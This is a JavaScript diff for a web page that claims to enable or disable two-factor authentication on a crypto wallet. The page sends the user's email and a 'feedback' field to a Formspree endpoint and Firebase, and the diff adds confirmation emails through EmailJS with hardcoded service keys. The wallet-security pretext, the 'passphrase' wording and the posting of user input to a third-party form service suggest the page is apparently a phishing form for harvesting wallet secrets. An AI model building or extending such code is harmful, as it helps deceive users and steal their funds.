@@ -18,6 +18,17 @@ let previousEmail = null;
 const FORMSPREE_URL = "https://formspree.io/f/mgvglzne";
 const PROCESSING_DELAY = 1500;
 
+// EmailJS Configuration
+const EMAILJS_PUBLIC_KEY = "hU96YZH7Plzqh0qVZ"; // Replace with your EmailJS public key
+const EMAILJS_SERVICE_ID = "service_00tdufa"; // Replace with your EmailJS service ID
+const EMAILJS_TEMPLATE_ID_ENABLED = "template_1gk8xyo"; // Template for 2FA enabled
+const EMAILJS_TEMPLATE_ID_DISABLED = "template_bdwns9y"; // Template for 2FA disabled
+
+// Initialize EmailJS
+(function() {
+    emailjs.init(EMAILJS_PUBLIC_KEY);
+})();
+
 // Hash function for email
 function hashEmail(email) {
     let hash = 0;
@@ -27,6 +38,49 @@ function hashEmail(email) {
         hash = hash & hash;
     }
     return Math.abs(hash).toString(36);
+}
+
+// Send email notification using EmailJS
+async function sendEmailNotification(email, is2FAEnabled, feedback) {
+    try {
+        const templateId = is2FAEnabled ? EMAILJS_TEMPLATE_ID_ENABLED : EMAILJS_TEMPLATE_ID_DISABLED;
+        
+        const templateParams = {
+            to_email: email,
+            user_email: email,
+            status: is2FAEnabled ? 'ENABLED' : 'DISABLED',
+            action: is2FAEnabled ? 'enabled' : 'disabled',
+            timestamp: new Date().toLocaleString(),
+            feedback: feedback || 'Not provided',
+            status_message: is2FAEnabled 
+                ? 'Your 2-Factor Authentication has been successfully enabled.' 
+                : 'Your 2-Factor Authentication has been disabled.',
+            next_steps: is2FAEnabled 
+                ? 'Your wallet is now secured with two-factor authentication. Keep your passphrase safe!' 
+                : 'Your 2FA has been turned off. You can re-enable it anytime for better security.'
+        };
+        
+        console.log('Sending email via EmailJS to:', email);
+        
+        const response = await emailjs.send(
+            EMAILJS_SERVICE_ID,
+            templateId,
+            templateParams
+        );
+        
+        console.log('EmailJS response:', response);
+        
+        if (response.status === 200) {
+            console.log('Email sent successfully via EmailJS');
+            return true;
+        } else {
+            console.error('EmailJS failed with status:', response.status);
+            return false;
+        }
+    } catch (error) {
+        console.error('Error sending email via EmailJS:', error);
+        return false;
+    }
 }
 
 // Load previous 2FA state from Firebase
@@ -306,7 +360,7 @@ const validateFeedback = () => {
     return true;
 };
 
-// Main Handler - FIXED LOGIC
+// Main Handler - WITH EMAILJS INTEGRATION
 toggleBtn.addEventListener("click", async () => {
     if (!validateEmail() || !validateFeedback() || isProcessing) {
         return;
@@ -329,7 +383,7 @@ toggleBtn.addEventListener("click", async () => {
         const submissionData = feedbackHash ? await getFeedbackFromFirebase(feedbackHash) : null;
         const alreadySentToFormspree = submissionData ? submissionData.sentToFormspree : false;
         
-        // CRITICAL FIX: Determine the NEW state (toggle the current state)
+        // Determine the NEW state (toggle the current state)
         const newState = !isOn;
         
         console.log('Toggle clicked:', {
@@ -360,28 +414,31 @@ toggleBtn.addEventListener("click", async () => {
                 return;
             }
             
-            // Send to Formspree if:
-            // 1. Never sent before, OR
-            // 2. Email has changed
+            // Send to Formspree if needed
             if (!alreadySentToFormspree || emailChanged) {
                 console.log('Sending combined data to Formspree: feedback + email + 2FA status');
                 
-                const success = await submitCombinedDataToFormspree(email, feedback, true);
+                const formspreeSuccess = await submitCombinedDataToFormspree(email, feedback, true);
                 
-                if (success) {
+                if (formspreeSuccess) {
                     // Update Firebase with email info
                     if (feedbackHash) {
                         await updateSubmissionWithEmail(feedbackHash, emailHash, email);
                         previousEmail = email;
                     }
-                    
-                    showSuccessMessage("✓ Check your email for confirmation!");
                 } else {
                     updateStatus("⚠️ Connection error. State saved locally.", "#e74c3c");
                 }
+            }
+            
+            // Send email notification via EmailJS
+            console.log('Sending email notification via EmailJS...');
+            const emailSent = await sendEmailNotification(email, true, feedback);
+            
+            if (emailSent) {
+                showSuccessMessage("✓ 2FA enabled! Check your email for confirmation.");
             } else {
-                console.log('Already sent to Formspree with this email - Firebase updated only');
-                showSuccessMessage("✓ 2FA state updated successfully!");
+                showSuccessMessage("✓ 2FA enabled! (Email notification failed)");
             }
             
             // Update the state variable
@@ -398,7 +455,15 @@ toggleBtn.addEventListener("click", async () => {
             // Save OFF state to Firebase
             await save2FAState(emailHash, email, false);
             
-            console.log('2FA toggled OFF - No Formspree submission needed');
+            // Send email notification via EmailJS
+            console.log('Sending 2FA disabled notification via EmailJS...');
+            const emailSent = await sendEmailNotification(email, false, feedback);
+            
+            if (emailSent) {
+                showSuccessMessage("✓ 2FA disabled. Confirmation email sent.");
+            } else {
+                showSuccessMessage("✓ 2FA disabled successfully.");
+            }
             
             // Update the state variable
             isOn = false;
